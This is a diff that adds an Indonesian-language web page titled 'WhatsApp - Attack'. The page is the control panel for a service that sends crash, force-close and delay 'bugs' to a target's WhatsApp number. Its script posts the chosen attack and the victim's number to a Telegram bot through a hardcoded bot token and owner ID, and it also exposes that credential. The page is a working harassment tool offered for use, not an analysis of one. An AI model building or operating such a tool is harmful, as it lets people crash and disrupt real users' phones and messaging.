@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>WhatsApp - Attack</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{box-sizing:border-box;font-family:Arial,sans-serif}
+body{margin:0;background:#000;color:#fff}
+.container{max-width:420px;margin:auto;padding:20px}
+.avatar{width:120px;height:120px;border-radius:50%;padding:4px;
+background:linear-gradient(45deg,#d32f2f,#ff5252);box-shadow:0 0 20px rgba(255,0,0,.6);
+margin:auto;animation:pulse 2s infinite alternate}
+.avatar img{width:100%;height:100%;border-radius:50%;background:#1a1a1a}
+@keyframes pulse{from{box-shadow:0 0 10px rgba(255,0,0,.4)}to{box-shadow:0 0 30px rgba(255,0,0,.9)}}
+.username{text-align:center;margin-top:14px;font-size:24px;font-weight:900}
+.role{text-align:center;margin-top:6px;padding:6px 14px;display:inline-block;border-radius:20px;
+border:1px solid rgba(255,0,0,.4);color:#ff5252;background:#1a1a1a}
+.video-box{margin:20px 0;border-radius:12px;overflow:hidden;border:1px solid rgba(255,0,0,.3);box-shadow:0 0 20px rgba(255,0,0,.3)}
+video{width:100%}
+.label{background:linear-gradient(90deg,#d32f2f,#ff5252);padding:8px 12px;border-radius:8px;font-weight:bold;margin-bottom:8px}
+.input,select{width:100%;padding:14px;border-radius:14px;border:1px solid rgba(255,0,0,.5);
+background:#1a1a1a;color:white;margin-bottom:20px}
+.send-btn{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(45deg,#d32f2f,#ff5252);
+color:white;font-weight:900;letter-spacing:1px;cursor:pointer;box-shadow:0 0 20px rgba(255,0,0,.6)}
+
+#consoleBox{
+ margin-top:18px;
+ padding:14px;
+ border-radius:12px;
+ display:none;
+ font-weight:bold;
+ font-size:15px;
+ text-align:center;
+ background:#013b1b;
+ color:#5dff9d;
+ border:2px solid #00ff80;
+ box-shadow:0 0 12px #00ff80;
+}
+#consoleBox::before{
+ content:"✔ ";
+ font-weight:900;
+ color:#5dff9d;
+ font-size:18px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="avatar"><img src="https://files.catbox.moe/x6243j.jpg"></div>
+  <div class="username" id="username"></div>
+  <div style="text-align:center"><div class="role" id="role"></div></div>
+
+  <div class="video-box">
+    <video autoplay loop muted><source src="https://files.catbox.moe/scpq8t.mp4" type="video/mp4"></video>
+  </div>
+
+  <div class="label">Nomor Target</div>
+  <input id="target" class="input" placeholder="62xxxxxxxxxx">
+
+  <div class="label">Pilih Bug</div>
+  <select id="bugList">
+    <option value="overight">DELAY 50%</option>
+    <option value="overight">DELAY 100%</option>
+    <option value="overight">CRASH X INVIS</option>
+    <option value="overight">FC INVISIBLE</option>
+    <option value="overight">FORCLOSE 1 MSG</option>
+    <option value="overight">FC X DELAY NEW</option>
+  </select>
+
+  <button class="send-btn" id="sendBtn" onclick="sendBug()">🚀 SEND BUG</button>
+
+  <div id="consoleBox"></div> <!-- 📌 STATUS AKAN MUNCUL DISINI -->
+</div>
+
+<script>
+const BOT_TOKEN="8426368219:AAEL_0WOOLSBJdKziPZ7SED_TQ8DveKE8cw";
+const OWNER_ID="6696150439";
+
+document.getElementById("username").innerText=localStorage.getItem("username")||"Guest User";
+document.getElementById("role").innerText=(localStorage.getItem("role")||"User").toUpperCase();
+
+function showConsole(msg){
+ let box=document.getElementById("consoleBox");
+ box.innerText=msg;
+ box.style.display="block";
+}
+
+function startCooldown(){
+ let btn=document.getElementById("sendBtn");
+ let cd=600;
+ btn.disabled=true;
+
+ let timer=setInterval(()=>{
+  cd--;
+  btn.innerText="Cooldown ("+cd+"s)";
+  if(cd<=0){
+    clearInterval(timer);
+    btn.disabled=false;
+    btn.innerText="🚀 SEND BUG";
+  }
+ },1000);
+}
+
+async function sendBug(){
+ const target=document.getElementById("target").value.trim();
+ const bug=document.getElementById("bugList").value;
+
+ if(!target.startsWith("62")||target.length<10){
+   showConsole("❗ Nomor tidak valid!");
+   return;
+ }
+
+ const message=`/${bug} ${target}`;
+
+ fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body:JSON.stringify({chat_id:OWNER_ID,text:message})
+ });
+
+ showConsole("Berhasil mengirim bug ke +"+target+"!");
+ startCooldown();
+}
+</script>
+
+</body>
+</html>
